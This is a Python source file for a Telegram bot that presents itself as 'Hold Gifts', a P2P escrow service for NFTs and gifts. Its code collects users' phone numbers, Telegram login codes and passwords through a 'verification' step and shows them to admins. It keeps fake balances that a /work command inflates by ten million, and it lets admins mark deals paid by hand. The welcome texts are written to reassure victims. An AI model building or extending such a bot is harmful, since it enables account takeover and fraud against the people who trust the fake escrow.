import asyncio
import json
import os
import uuid
import random
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web

# ============================================================
# 1. КОНФИГУРАЦИЯ (BOTHOST.RU + @holdnftgiftbot)
# ============================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "9118390399:AAEF-AqbDxsl0sRTNZB2yzkHXmW3ksWMAtY")
MASTER_ADMIN_ID = 1544353769
DEFAULT_ADMINS = {1544353769, 8986358602}

BOT_USERNAME = "holdnftgiftbot"
BOT_NAME = "Hold Gifts"
NFT_ESCROW_ACCOUNT = "Trustnftgift"
MINI_APP_URL = "https://bot-1795612426-1404-uhffhbafvbfb.bothost.tech"
PORT = int(os.environ.get("PORT", 3000))

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 2. PREMIUM ЭМОДЗИ
# ============================================================
EMOJI_MAP = {
    "briefcase": {"premium": "5893255507380014983", "normal": "💼"},
    "zap": {"premium": "5893450623449305489", "normal": "⚡️"},
    "one": {"premium": "5794164805065514131", "normal": "1️⃣"},
    "two": {"premium": "5794085322400733645", "normal": "2️⃣"},
    "three": {"premium": "5794280000383358988", "normal": "3️⃣"},
    "four": {"premium": "5794241397217304511", "normal": "4️⃣"},
    "bulb": {"premium": "5893290369629556374", "normal": "💡"},
    "arrow_down": {"premium": "6037157012242960559", "normal": "⬇️"},
    "wallet": {"premium": "5902206159095339799", "normal": "💰"},
    "list": {"premium": "6039404727542747508", "normal": "📋"},
    "book": {"premium": "6039584437564347225", "normal": "📖"},
    "globe": {"premium": "5776233299424843260", "normal": "🌐"},
    "gear": {"premium": "6032742198179532882", "normal": "⚙️"},
    "check": {"premium": "5895514131896733546", "normal": "✅"},
    "cross": {"premium": "5893163582194978381", "normal": "❌"},
    "gift": {"premium": "6037175527846975726", "normal": "🎁"},
    "crown": {"premium": "5805553606635559688", "normal": "👑"},
    "user": {"premium": "6032994772321309200", "normal": "👤"},
    "headset": {"premium": "5886437972647088483", "normal": "🎧"},
    "shield": {"premium": "5902016123972358349", "normal": "🛡"},
    "rocket": {"premium": "6041705726206808304", "normal": "🚀"},
    "star": {"premium": "6028338546736107668", "normal": "⭐️"},
    "ton": {"premium": "6037083366438737901", "normal": "💎"},
    "stars": {"premium": "5767199127775481841", "normal": "⭐️"},
    "rub": {"premium": "5778421276024509124", "normal": "₽"},
    "uah": {"premium": "5776233299424843260", "normal": "₴"},
}

def get_emoji(key: str, is_premium: bool = True) -> str:
    data = EMOJI_MAP.get(key, {})
    premium_id = data.get("premium")
    normal = data.get("normal", "")
    if is_premium and premium_id and normal:
        return f'<tg-emoji emoji-id="{premium_id}">{normal}</tg-emoji>'
    return normal

def get_emoji_id(key: str) -> str | None:
    return EMOJI_MAP.get(key, {}).get("premium")

def premium_button(text: str, emoji_key: str | None = None, **kwargs):
    emoji_id = get_emoji_id(emoji_key) if emoji_key else None
    if emoji_id:
        try:
            return InlineKeyboardButton(
                text=text,
                icon_custom_emoji_id=emoji_id,
                **kwargs
            )
        except Exception:
            normal = EMOJI_MAP.get(emoji_key, {}).get("normal", "")
            return InlineKeyboardButton(
                text=f"{normal} {text}" if normal else text,
                **kwargs
            )
    return InlineKeyboardButton(text=text, **kwargs)

# ============================================================
# 3. БАЗА ДАННЫХ (JSON)
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "verification": "verification.json",
    "verification_requests": "verification_requests.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "stats": "stats.json",
    "rekvisits": "rekvisits.json",
    "tickets": "tickets.json",
    "chat_messages": "chat_messages.json",
    "freeze": "freeze.json",
    "welcome_media": "welcome_media.json"
}

def load_json(file):
    if os.path.exists(file):
        try:
            with open(file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
verification_data = load_json(FILES["verification"])
verification_requests = load_json(FILES["verification_requests"])
withdraw_requests = load_json(FILES["withdraw"])
logs = load_json(FILES["logs"])
user_language = load_json(FILES["user_language"])
stats = load_json(FILES["stats"])
rekvisits = load_json(FILES["rekvisits"])
tickets = load_json(FILES["tickets"])
chat_messages = load_json(FILES["chat_messages"])
freeze_data = load_json(FILES["freeze"])
welcome_media = load_json(FILES["welcome_media"])

# ============================================================
# 4. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int | str | None) -> bool:
    if not user_id:
        return False
    try:
        uid_int = int(user_id)
    except ValueError:
        return False
    return uid_int in DEFAULT_ADMINS or str(uid_int) in admins

def get_balance(user_id: int | str):
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int | str, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = round(balance[uid].get(curr, 0) + amount, 4)
    save_json(FILES["balance"], balance)

def set_balance(user_id: int | str, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = round(amount, 4)
    save_json(FILES["balance"], balance)

def get_user_language(user_id: int | str) -> str:
    return user_language.get(str(user_id), "")

def set_user_language(user_id: int | str, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def is_verified(user_id: int | str) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        if (datetime.now() - verified_time).total_seconds() > 86400:
            return False
        return True
    return False

def complete_verification(user_id: int | str, phone: str, code: str):
    uid = str(user_id)
    verification_data[uid] = {
        "verified_at": datetime.now().isoformat(),
        "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
        "phone": phone,
        "code": code,
        "method": "account_login"
    }
    save_json(FILES["verification"], verification_data)

async def log_to_master(text: str):
    for admin_id in DEFAULT_ADMINS:
        try:
            await bot.send_message(admin_id, text)
        except Exception:
            pass

def log_action(action: str, data: dict):
    log_id = str(uuid.uuid4())[:8]
    logs[log_id] = {
        "id": log_id,
        "time": datetime.now().isoformat(),
        "action": action,
        "data": data
    }
    save_json(FILES["logs"], logs)

def build_webapp_url(user_id: int, page: str = "", deal_id: str = None, role: str = None) -> str:
    lang = get_user_language(user_id) or "ru"
    params = [f"lang={lang}"]
    if page:
        params.append(f"page={page}")
    if deal_id:
        params.append(f"deal={deal_id}")
    if role:
        params.append(f"role={role}")
    return f"{MINI_APP_URL}?{'&'.join(params)}"

# ============================================================
# 5. КЛАВИАТУРЫ (ЧИСТЫЕ, УДОБНЫЕ, МУЛЬТИЯЗЫЧНЫЕ)
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id) or "ru"
    if lang == "en":
        buttons = [
            [
                premium_button("Open Hold Gifts", "rocket", web_app=WebAppInfo(url=build_webapp_url(user_id))),
            ],
            [
                premium_button("Sell (with Buyer)", "briefcase", web_app=WebAppInfo(url=build_webapp_url(user_id, page="create", role="seller"))),
                premium_button("Buy (with Seller)", "gift", web_app=WebAppInfo(url=build_webapp_url(user_id, page="create", role="buyer"))),
            ],
            [
                premium_button("My Deals", "list", callback_data="menu_deals"),
                premium_button("Balance", "wallet", callback_data="menu_balance"),
            ],
            [
                premium_button("How it works", "shield", callback_data="how_to_deal"),
                premium_button("Language", "globe", callback_data="select_language"),
            ]
        ]
        if is_admin(user_id):
            buttons.append([premium_button("Admin Panel", "crown", callback_data="menu_admin")])
    else:
        buttons = [
            [
                premium_button("Открыть Hold Gifts", "rocket", web_app=WebAppInfo(url=build_webapp_url(user_id))),
            ],
            [
                premium_button("Сделка с покупателем", "briefcase", web_app=WebAppInfo(url=build_webapp_url(user_id, page="create", role="seller"))),
                premium_button("Сделка с продавцом", "gift", web_app=WebAppInfo(url=build_webapp_url(user_id, page="create", role="buyer"))),
            ],
            [
                premium_button("Мои сделки", "list", callback_data="menu_deals"),
                premium_button("Баланс", "wallet", callback_data="menu_balance"),
            ],
            [
                premium_button("Как это работает", "shield", callback_data="how_to_deal"),
                premium_button("Язык / Language", "globe", callback_data="select_language"),
            ]
        ]
        if is_admin(user_id):
            buttons.append([premium_button("Админ-панель", "crown", callback_data="menu_admin")])

    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            premium_button("Начислить", "wallet", callback_data="admin_add_balance"),
            premium_button("Статистика", "zap", callback_data="admin_stats"),
        ],
        [
            premium_button("Все сделки", "list", callback_data="admin_all_deals"),
            premium_button("Пользователи", "user", callback_data="admin_users"),
        ],
        [
            premium_button("Выводы", "gift", callback_data="admin_withdraw_requests"),
            premium_button("Верификация", "check", callback_data="admin_verification"),
        ],
        [
            premium_button("Тикеты", "headset", callback_data="admin_tickets"),
            premium_button("Админы", "crown", callback_data="admin_manage_admins"),
        ],
        [
            premium_button("Приветствие медиа", "star", callback_data="admin_welcome_media"),
            premium_button("Логи", "book", callback_data="admin_logs"),
        ],
        [premium_button("В главное меню", "arrow_down", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int = 0):
    lang = get_user_language(user_id) or "ru"
    text = "Main Menu" if lang == "en" else "В главное меню"
    return InlineKeyboardMarkup(inline_keyboard=[
        [premium_button(text, "arrow_down", callback_data="back_to_main")]
    ])

def language_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🇷🇺 Русский", callback_data="set_lang_ru"),
            InlineKeyboardButton(text="🇬🇧 English", callback_data="set_lang_en")
        ],
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            premium_button("TON", "ton", callback_data="curr_TON"),
            premium_button("STARS", "stars", callback_data="curr_STARS")
        ],
        [
            premium_button("RUB", "rub", callback_data="curr_RUB"),
            premium_button("UAH", "uah", callback_data="curr_UAH")
        ],
    ])

def mini_app_keyboard(text: str, user_id: int, page: str = "", deal_id: str = None):
    lang = get_user_language(user_id) or "ru"
    back_text = "Main Menu" if lang == "en" else "В главное меню"
    url = build_webapp_url(user_id, page=page, deal_id=deal_id)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=text, web_app=WebAppInfo(url=url))],
        [premium_button(back_text, "arrow_down", callback_data="back_to_main")]
    ])

# ============================================================
# 6. ТЕКСТЫ ПРИВЕТСТВИЯ И ГАЙДА (СПОКОЙНЫЕ, БЕЗ ПУГАЮЩИХ СЛОВ)
# ============================================================
def get_welcome_text(user_id: int) -> str:
    lang = get_user_language(user_id) or "ru"
    if lang == "en":
        return (
            f"{get_emoji('shield')} <b>Hold Gifts — P2P Escrow Service</b>\n\n"
            f"Safe exchange of Telegram gifts, NFTs, and digital assets.\n\n"
            f"{get_emoji('check')} <b>Escrow protection</b> — funds are held until delivery\n"
            f"{get_emoji('zap')} <b>Two-way deals</b> — create as a seller or a buyer\n"
            f"{get_emoji('gift')} <b>Official escrow account:</b> @{NFT_ESCROW_ACCOUNT}\n\n"
            f"Choose an action below:"
        )
    return (
        f"{get_emoji('shield')} <b>Hold Gifts — P2P-гарант</b>\n\n"
        f"Безопасный обмен Telegram-подарками, NFT и цифровыми товарами.\n\n"
        f"{get_emoji('check')} <b>Защита сделки</b> — оплата резервируется до получения\n"
        f"{get_emoji('zap')} <b>Двусторонний формат</b> — создавайте сделку как продавец или покупатель\n"
        f"{get_emoji('gift')} <b>Официальный гарант-аккаунт:</b> @{NFT_ESCROW_ACCOUNT}\n\n"
        f"Выберите действие ниже:"
    )

def get_guide_text(user_id: int) -> str:
    lang = get_user_language(user_id) or "ru"
    if lang == "en":
        return (
            f"{get_emoji('shield')} <b>How Hold Gifts works</b>\n\n"
            f"{get_emoji('one')} <b>Create a deal</b> — choose your role (Seller or Buyer), enter item details and amount.\n"
            f"{get_emoji('two')} <b>Share the link</b> — send the generated deal link to your partner.\n"
            f"{get_emoji('three')} <b>Secure payment</b> — the buyer deposits funds into escrow.\n"
            f"{get_emoji('four')} <b>Asset transfer</b> — for NFTs/Gifts, transfer is processed via @{NFT_ESCROW_ACCOUNT}.\n"
            f"{get_emoji('check')} <b>Completion</b> — once the buyer confirms receipt, funds are credited to the seller."
        )
    return (
        f"{get_emoji('shield')} <b>Как проходит сделка в Hold Gifts</b>\n\n"
        f"{get_emoji('one')} <b>Создание</b> — выберите роль (продавец или покупатель), укажите товар и сумму.\n"
        f"{get_emoji('two')} <b>Приглашение</b> — отправьте готовую ссылку второму участнику.\n"
        f"{get_emoji('three')} <b>Резерв средств</b> — покупатель оплачивает сделку, сумма замораживается на балансе гаранта.\n"
        f"{get_emoji('four')} <b>Передача</b> — передача NFT и подарков проходит через @{NFT_ESCROW_ACCOUNT}.\n"
        f"{get_emoji('check')} <b>Выплата</b> — после подтверждения получения средства зачисляются продавцу."
    )

# ============================================================
# 7. УПРАВЛЕНИЕ ПРИВЕТСТВЕННЫМ МЕДИА (АДМИН)
# ============================================================
class AdminMediaStates(StatesGroup):
    waiting_media = State()

@dp.callback_query(lambda c: c.data == "admin_welcome_media")
async def admin_welcome_media(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return

    current = welcome_media.get("media", "Не установлено")
    current_type = welcome_media.get("type", "—")

    await callback.message.edit_text(
        f"{get_emoji('gift')} <b>Приветственное медиа</b>\n\n"
        f"Текущее: {current} ({current_type})\n\n"
        f"Отправьте <b>фото</b>, <b>видео</b> или <b>GIF</b> для установки.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [premium_button("Удалить медиа", "cross", callback_data="admin_clear_media")],
            [premium_button("Назад", "arrow_down", callback_data="menu_admin")]
        ])
    )
    await state.set_state(AdminMediaStates.waiting_media)
    await callback.answer()

@dp.message(AdminMediaStates.waiting_media)
async def admin_save_media(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        await state.clear()
        return

    media_data = {}
    if message.photo:
        media_data = {"file_id": message.photo[-1].file_id, "type": "photo", "media": "Фото"}
    elif message.video:
        media_data = {"file_id": message.video.file_id, "type": "video", "media": "Видео"}
    elif message.animation:
        media_data = {"file_id": message.animation.file_id, "type": "gif", "media": "GIF"}
    else:
        await message.answer("Отправьте фото, видео или GIF.")
        return

    global welcome_media
    welcome_media.update(media_data)
    save_json(FILES["welcome_media"], welcome_media)

    await message.answer(
        f"{get_emoji('check')} Приветственное медиа обновлено ({media_data['media']}).",
        reply_markup=admin_panel_keyboard()
    )
    await state.clear()

@dp.callback_query(lambda c: c.data == "admin_clear_media")
async def admin_clear_media(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return

    global welcome_media
    welcome_media = {}
    save_json(FILES["welcome_media"], welcome_media)

    await callback.message.edit_text(
        f"{get_emoji('check')} Приветственное медиа удалено.",
        reply_markup=admin_panel_keyboard()
    )
    await state.clear()
    await callback.answer()

# ============================================================
# 8. ОТПРАВКА И РЕДАКТИРОВАНИЕ ПРИВЕТСТВИЯ
# ============================================================
async def send_welcome(target_message: types.Message, user_id: int, edit: bool = False):
    text = get_welcome_text(user_id)
    markup = main_menu_keyboard(user_id)

    media_type = welcome_media.get("type")
    media_file_id = welcome_media.get("file_id")

    if edit:
        try:
            if target_message.caption is not None:
                await target_message.edit_caption(caption=text, reply_markup=markup)
            else:
                await target_message.edit_text(text=text, reply_markup=markup)
            return
        except Exception:
            pass

    if media_file_id and media_type:
        try:
            if media_type == "photo":
                await target_message.answer_photo(photo=media_file_id, caption=text, reply_markup=markup)
                return
            elif media_type in ("video", "gif"):
                await target_message.answer_video(video=media_file_id, caption=text, reply_markup=markup)
                return
        except Exception as e:
            print(f"Ошибка медиа: {e}")

    await target_message.answer(text, reply_markup=markup)

# ============================================================
# 9. КОМАНДЫ /start И /work
# ============================================================
@dp.message(Command("work"))
async def cmd_work(message: types.Message):
    for curr in ["ton", "stars", "rub", "uah"]:
        add_balance(message.from_user.id, curr, 10000000)

    await message.answer(
        f"{get_emoji('check')} <b>Тестовый баланс начислен:</b>\n"
        f"• 10,000,000 TON / STARS / RUB / UAH",
        reply_markup=back_to_main_keyboard(message.from_user.id)
    )

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Гарантируем регистрацию пользователя в базе балансов
    get_balance(message.from_user.id)

    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_", 1)[1].strip()
        await handle_deal_link(message, deal_id)
        return

    lang = get_user_language(message.from_user.id)
    if not lang:
        await message.answer(
            f"{get_emoji('globe')} <b>Выберите язык / Choose your language:</b>",
            reply_markup=language_keyboard()
        )
        return

    await send_welcome(message, message.from_user.id, edit=False)

# ============================================================
# 10. НАВИГАЦИЯ И ЯЗЫК
# ============================================================
@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    await callback.answer("Language updated" if lang == "en" else "Язык обновлён")
    await send_welcome(callback.message, callback.from_user.id, edit=True)

@dp.callback_query(lambda c: c.data == "select_language")
async def select_language(callback: types.CallbackQuery):
    text = f"{get_emoji('globe')} <b>Выберите язык / Choose your language:</b>"
    if callback.message.caption is not None:
        await callback.message.delete()
        await callback.message.answer(text, reply_markup=language_keyboard())
    else:
        await callback.message.edit_text(text, reply_markup=language_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    await send_welcome(callback.message, callback.from_user.id, edit=True)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "how_to_deal")
async def how_to_deal(callback: types.CallbackQuery):
    text = get_guide_text(callback.from_user.id)
    markup = back_to_main_keyboard(callback.from_user.id)
    if callback.message.caption is not None:
        await callback.message.delete()
        await callback.message.answer(text, reply_markup=markup)
    else:
        await callback.message.edit_text(text, reply_markup=markup)
    await callback.answer()

# ============================================================
# 11. БАЛАНС И СДЕЛКИ В БОТЕ
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid) or "ru"
    bal = get_balance(uid)
    completed_count = len([
        d for d in deals.values()
        if (d.get("seller_id") == uid or d.get("buyer_id") == uid) and d.get("status") == "completed"
    ])

    if lang == "en":
        text = (
            f"{get_emoji('wallet')} <b>Your Balance</b>\n\n"
            f"{get_emoji('ton')} TON: <b>{bal.get('ton', 0)}</b>\n"
            f"{get_emoji('stars')} STARS: <b>{bal.get('stars', 0)}</b>\n"
            f"{get_emoji('rub')} RUB: <b>{bal.get('rub', 0)}</b>\n"
            f"{get_emoji('uah')} UAH: <b>{bal.get('uah', 0)}</b>\n\n"
            f"Completed deals: <b>{completed_count}</b>"
        )
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [premium_button("Open Wallet in App", "wallet", web_app=WebAppInfo(url=build_webapp_url(uid, page="balance")))],
            [premium_button("Main Menu", "arrow_down", callback_data="back_to_main")]
        ])
    else:
        text = (
            f"{get_emoji('wallet')} <b>Ваш баланс</b>\n\n"
            f"{get_emoji('ton')} TON: <b>{bal.get('ton', 0)}</b>\n"
            f"{get_emoji('stars')} STARS: <b>{bal.get('stars', 0)}</b>\n"
            f"{get_emoji('rub')} RUB: <b>{bal.get('rub', 0)}</b>\n"
            f"{get_emoji('uah')} UAH: <b>{bal.get('uah', 0)}</b>\n\n"
            f"Завершено сделок: <b>{completed_count}</b>"
        )
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [premium_button("Управление и вывод", "wallet", web_app=WebAppInfo(url=build_webapp_url(uid, page="balance")))],
            [premium_button("В главное меню", "arrow_down", callback_data="back_to_main")]
        ])

    if callback.message.caption is not None:
        await callback.message.delete()
        await callback.message.answer(text, reply_markup=keyboard)
    else:
        await callback.message.edit_text(text, reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    uid = callback.from_user.id
    uname = (callback.from_user.username or "").lower()
    lang = get_user_language(uid) or "ru"

    user_deals = []
    for d_id, d in deals.items():
        if (
            d.get("seller_id") == uid
            or d.get("buyer_id") == uid
            or (uname and d.get("seller_username", "").lower() == uname)
            or (uname and d.get("buyer_username", "").lower() == uname)
        ):
            user_deals.append((d_id, d))

    if not user_deals:
        text = "You have no active deals yet." if lang == "en" else "У вас пока нет сделок."
        markup = InlineKeyboardMarkup(inline_keyboard=[
            [premium_button("Create Deal" if lang == "en" else "Создать сделку", "briefcase", web_app=WebAppInfo(url=build_webapp_url(uid, page="create")))],
            [premium_button("Main Menu" if lang == "en" else "В главное меню", "arrow_down", callback_data="back_to_main")]
        ])
        if callback.message.caption is not None:
            await callback.message.delete()
            await callback.message.answer(text, reply_markup=markup)
        else:
            await callback.message.edit_text(text, reply_markup=markup)
        await callback.answer()
        return

    text = f"{get_emoji('list')} <b>{'My Deals' if lang == 'en' else 'Мои сделки'}</b>\n\n"
    for d_id, d in user_deals[-8:]:
        status_map = {
            "waiting_payment": "Waiting payment" if lang == "en" else "Ожидает оплаты",
            "paid": "Paid" if lang == "en" else "Оплачено",
            "awaiting_confirmation": "In delivery" if lang == "en" else "Передаётся",
            "completed": "Completed" if lang == "en" else "Завершено"
        }
        text += (
            f"<b>#{d_id}</b> • {status_map.get(d['status'], d['status'])}\n"
            f"📦 {d.get('product', '')[:28]} — <b>{d.get('amount', 0)} {d.get('currency', '')}</b>\n"
            f"👤 @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n\n"
        )

    markup = InlineKeyboardMarkup(inline_keyboard=[
        [premium_button("Open in App" if lang == "en" else "Открыть в приложении", "rocket", web_app=WebAppInfo(url=build_webapp_url(uid, page="deals")))],
        [premium_button("Main Menu" if lang == "en" else "В главное меню", "arrow_down", callback_data="back_to_main")]
    ])

    if callback.message.caption is not None:
        await callback.message.delete()
        await callback.message.answer(text[:4000], reply_markup=markup)
    else:
        await callback.message.edit_text(text[:4000], reply_markup=markup)
    await callback.answer()

# ============================================================
# 12. ССЫЛКА НА СДЕЛКУ (/start deal_XXX) — ДВУСТОРОННЯЯ ЛОГИКА
# ============================================================
async def handle_deal_link(message: types.Message, deal_id: str):
    uid = message.from_user.id
    uname = (message.from_user.username or "").lower()
    lang = get_user_language(uid) or "ru"

    global deals
    deals = load_json(FILES["deals"])

    if deal_id not in deals:
        text = (
            f"{get_emoji('cross')} Deal <b>#{deal_id}</b> not found or already closed."
            if lang == "en" else
            f"{get_emoji('cross')} Сделка <b>#{deal_id}</b> не найдена или уже закрыта."
        )
        await message.answer(text, reply_markup=back_to_main_keyboard(uid))
        return

    deal = deals[deal_id]
    creator_role = deal.get("creator_role", "seller")

    # Определяем, кем является зашедший пользователь
    is_target_buyer = (
        deal.get("buyer_id") == uid
        or (uname and deal.get("buyer_username", "").lower() == uname)
    )
    is_target_seller = (
        deal.get("seller_id") == uid
        or (uname and deal.get("seller_username", "").lower() == uname)
    )

    if not is_target_buyer and not is_target_seller:
        text = (
            f"{get_emoji('cross')} This deal is private and intended for @{deal.get('buyer_username')} and @{deal.get('seller_username')}."
            if lang == "en" else
            f"{get_emoji('cross')} Эта сделка приватная и предназначена для @{deal.get('seller_username')} и @{deal.get('buyer_username')}."
        )
        await message.answer(text, reply_markup=back_to_main_keyboard(uid))
        return

    # Привязываем Telegram ID второго участника при первом переходе
    updated = False
    if is_target_buyer and not deal.get("buyer_id"):
        deal["buyer_id"] = uid
        updated = True
    if is_target_seller and not deal.get("seller_id"):
        deal["seller_id"] = uid
        updated = True
    if updated:
        save_json(FILES["deals"], deals)

    nft_info = f"\n🔗 NFT: {deal['nft_link']}" if deal.get("nft_link") else ""

    if lang == "en":
        text = (
            f"{get_emoji('briefcase')} <b>Deal #{deal_id}</b>\n\n"
            f"📦 Item: <b>{deal['product']}</b>\n"
            f"💰 Amount: <b>{deal['amount']} {deal['currency']}</b>\n"
            f"👤 Seller: @{deal.get('seller_username', '?')}\n"
            f"👤 Buyer: @{deal.get('buyer_username', '?')}"
            f"{nft_info}\n\n"
            f"Open Mini App to continue:"
        )
        btn_text = "Open Deal"
    else:
        text = (
            f"{get_emoji('briefcase')} <b>Сделка #{deal_id}</b>\n\n"
            f"📦 Товар: <b>{deal['product']}</b>\n"
            f"💰 Сумма: <b>{deal['amount']} {deal['currency']}</b>\n"
            f"👤 Продавец: @{deal.get('seller_username', '?')}\n"
            f"👤 Покупатель: @{deal.get('buyer_username', '?')}"
            f"{nft_info}\n\n"
            f"Откройте приложение для продолжения:"
        )
        btn_text = "Открыть сделку"

    await message.answer(
        text,
        reply_markup=mini_app_keyboard(btn_text, uid, page="deals", deal_id=deal_id)
    )

# ============================================================
# 13. АДМИН-ПАНЕЛЬ И КОМАНДЫ
# ============================================================
@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    text = f"{get_emoji('crown')} <b>Админ-панель Hold Gifts</b>\n\nВыберите раздел:"
    if callback.message.caption is not None:
        await callback.message.delete()
        await callback.message.answer(text, reply_markup=admin_panel_keyboard())
    else:
        await callback.message.edit_text(text, reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_all_deals")
async def admin_all_deals(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    if not deals:
        await callback.message.edit_text("Сделок пока нет.", reply_markup=admin_panel_keyboard())
        return
    text = f"{get_emoji('list')} <b>Последние сделки</b>\n\n"
    for d_id, d in list(deals.items())[-15:]:
        text += (
            f"<b>#{d_id}</b> | {d.get('status')}\n"
            f"👤 @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
            f"💰 {d.get('amount', 0)} {d.get('currency', '')} | {d.get('product', '')[:25]}\n"
            f"Команды: /pay {d_id} | /delete_deal {d_id}\n\n"
        )
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.message(Command("pay"))
async def admin_pay_deal(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("Использование: /pay [deal_id]")
        return
    deal_id = args[1]
    if deal_id not in deals:
        await message.answer("Сделка не найдена.")
        return
    deal = deals[deal_id]
    deal["status"] = "paid"
    deal["paid_by_admin"] = message.from_user.id
    save_json(FILES["deals"], deals)
    await message.answer(f"✅ Оплата по сделке #{deal_id} подтверждена.")
    if deal.get("seller_id"):
        try:
            await bot.send_message(
                deal["seller_id"],
                f"💎 <b>Сделка #{deal_id} оплачена!</b>\n\n"
                f"📦 Товар: {deal['product']}\n"
                f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                f"Передайте товар/NFT и подтвердите в приложении.",
                reply_markup=mini_app_keyboard("Открыть сделки", deal["seller_id"], page="deals")
            )
        except Exception:
            pass

@dp.message(Command("delete_deal"))
async def delete_deal_command(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2:
        await message.answer("Использование: /delete_deal [deal_id]")
        return
    deal_id = args[1]
    if deal_id not in deals:
        await message.answer("Сделка не найдена.")
        return
    del deals[deal_id]
    save_json(FILES["deals"], deals)
    await message.answer(f"✅ Сделка #{deal_id} удалена.")

@dp.callback_query(lambda c: c.data == "admin_users")
async def admin_users(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    if not balance:
        await callback.message.edit_text("Пользователей пока нет.", reply_markup=admin_panel_keyboard())
        return
    text = f"{get_emoji('user')} <b>Пользователи ({len(balance)})</b>\n\n"
    for uid, data in list(balance.items())[-20:]:
        text += (
            f"🆔 <code>{uid}</code> — "
            f"TON: {data.get('ton', 0)} | STARS: {data.get('stars', 0)} | RUB: {data.get('rub', 0)}\n"
        )
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_verification")
async def admin_verification(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    pending = {k: v for k, v in verification_requests.items() if v.get("status") == "pending"}
    if not pending:
        await callback.message.edit_text("Нет активных заявок на верификацию.", reply_markup=admin_panel_keyboard())
        return
    text = f"{get_emoji('check')} <b>Заявки на верификацию</b>\n\n"
    for rid, req in list(pending.items())[-10:]:
        text += (
            f"<b>#{rid}</b> | @{req.get('username', '?')} (ID: {req.get('user_id')})\n"
            f"📞 {req.get('phone', '—')} | Код: {req.get('code', '—')} | Пароль: {req.get('password', '—')}\n"
            f"/verify_confirm {rid} | /verify_reject {rid}\n\n"
        )
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

